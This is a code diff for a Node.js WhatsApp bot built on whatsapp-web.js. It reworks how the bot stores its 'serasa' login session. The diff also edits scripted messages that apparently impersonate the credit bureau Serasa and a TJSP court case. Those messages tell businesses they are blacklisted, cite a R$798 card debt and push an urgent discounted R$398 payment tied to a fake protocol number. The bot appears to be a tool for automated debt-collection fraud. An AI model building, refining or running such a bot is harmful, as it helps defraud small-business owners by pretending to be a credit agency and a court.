@@ -7,6 +7,45 @@ const { Client, LocalAuth, MessageTypes, MessageMedia } = require('whatsapp-web.
 const cors = require('cors');
 const compression = require('compression');
 
+// -------------------------------
+// SOLUÇÃO DEFINITIVA - INÍCIO
+// -------------------------------
+const SESSION_NAME = 'serasa';
+const AUTH_DIR = path.join(__dirname, '.wwebjs_auth');
+
+// 1. Limpeza total de sessões antigas
+const cleanAllSessions = () => {
+  // Remove todas as pastas de sessão exceto a que queremos manter
+  if (fs.existsSync(AUTH_DIR)) {
+    fs.readdirSync(AUTH_DIR).forEach(file => {
+      if (file !== SESSION_NAME) {
+        fs.rmSync(path.join(AUTH_DIR, file), { recursive: true, force: true });
+      }
+    });
+  }
+  
+  // Garante que a pasta de sessão desejada existe
+  if (!fs.existsSync(path.join(AUTH_DIR, SESSION_NAME))) {
+    fs.mkdirSync(path.join(AUTH_DIR, SESSION_NAME), { recursive: true });
+  }
+};
+cleanAllSessions();
+
+// 2. Monkey patch para interceptar criação de pastas
+const originalMkdir = fs.mkdirSync;
+fs.mkdirSync = function(dirPath, options) {
+  if (typeof dirPath === 'string' && dirPath.includes('session-serasa')) {
+    dirPath = dirPath.replace('session-serasa', SESSION_NAME);
+  }
+  return originalMkdir.call(this, dirPath, options);
+};
+
+// 3. Força variáveis de ambiente
+process.env.WA_SESSION_NAME = SESSION_NAME;
+process.env.WA_DATA_PATH = AUTH_DIR;
+// -------------------------------
+// SOLUÇÃO DEFINITIVA - FIM
+// -------------------------------
 
 const app = express();
 const PORT = 4000;
@@ -18,13 +57,16 @@ const cache = {
 
 const CACHE_TTL = 300000;
 
-
 let qrBase64 = '';
 let isConnected = false;
 
-// client criado com LocalAuth (reconecta automaticamente, por isso o cuidado extra)
+// Configuração do cliente com caminhos absolutos
 const client = new Client({
-  authStrategy: new LocalAuth({ clientId: "serasa" }),
+  authStrategy: new LocalAuth({ 
+    clientId: SESSION_NAME,
+    dataPath: AUTH_DIR,
+    sessionPath: path.join(AUTH_DIR, SESSION_NAME)
+  }),
   puppeteer: {
     headless: true,
     args: [
@@ -45,15 +87,22 @@ const client = new Client({
       '--no-first-run',
       '--safebrowsing-disable-auto-update',
       '--memory-pressure-off',
-      '--max-old-space-size=512', // Limitar memória
+      '--max-old-space-size=512',
       '--disable-features=TranslateUI,BlinkGenPropertyTrees'
     ],
-    executablePath: null, // Deixar Puppeteer escolher
-    slowMo: 100, // Adicionar delay entre ações
-    defaultViewport: { width: 800, height: 600 }, // Viewport menor
+    executablePath: null,
+    slowMo: 100,
+    defaultViewport: { width: 800, height: 600 },
     devtools: false
   }
 });
+
+// Verificação em tempo real
+client.on('authenticated', () => {
+  console.log('✅ Sessão salva em:', path.join(AUTH_DIR, SESSION_NAME));
+  console.log('Conteúdo:', fs.readdirSync(path.join(AUTH_DIR, SESSION_NAME)));
+});
+
 
 // requisições do cors
 app.use(cors({
@@ -273,7 +322,7 @@ async function processarMensagens(msg) {
     const msgPadraoTjsp = '⚖️ *Processo em andamento:* _Credor_\n\n🏦 *Banco:* _Itaú_\n*Agência:* _1370_\n*Endereço:* _Av. Barão de Itapura, 1003 - Vila Itapura, Campinas - SP, 13020-432_\n\n💬 *Mensagem:* _O credor avaliará a proposta podendo ser aceita ou recusada._\n\n💡 _O Devedor deverá cumprir rigorosamente os termos do acordo para evitar nova ação judicial._';
     const msgErroTjsp = '⚠️ *Processo não localizado na base pública!*\n\n_Entre em contato com o consultor e solicite uma chave válida!_';
     const tjspKey = '129300000BLT14';
-    const mensagemCartao = '⚠️ *Sua empresa está NEGATIVADA!*\n\n➡️ A credora reivindica valores pendentes referentes aos serviços disponibilizados no aparelho, realizados por meio de crédito e débito.\n O valor fixado pela credora reclamante é de *R$798,00*, referente a cobrança anual pelo uso.\n\n💡 Está sendo liberado uma *ordem de pagamento pelo Feirão!*\nLiquide já a sua pendência pelo valor de *R$398,00* com *QUITAÇÃO IMEDIATA!*\n\n➡️ *129300000BLT14* é o número do protocolo de anuências, com este código eletrônico, sua empresa  está assegurada de apontamento no Score, Cadin Federal, CNPJ, Bacem e Spc.';
+    const mensagemCartao = '⚠️ *Sua empresa está NEGATIVADA!*\n\n➡️ A credora reivindica valores pendentes referentes aos serviços disponibilizados no aparelho, realizados por meio de crédito e débito.\nO valor fixado pela credora reclamante é de *R$798,00.*\n\n💡 Está sendo liberado uma ordem de pagamento pelo Feirão!\nLiquide já a sua pendência pelo valor de *R$398,00* com *QUITAÇÃO IMEDIATA!*\n\n➡️ *129300000BLT14* é o número do protocolo de anuências.\nApós o pagamento sua dívida junto à bandeira de cartão credora e à Serasa será dada baixa.\nE também sua empresa estará assegurada de apontamento no Score, Cadin Federal, CNPJ, Bacen e SPC.';
     const MAX_ATTEMPTS = 3;
     
     if (!state[from]) state[from] = { attempts: 0, step: 0 };
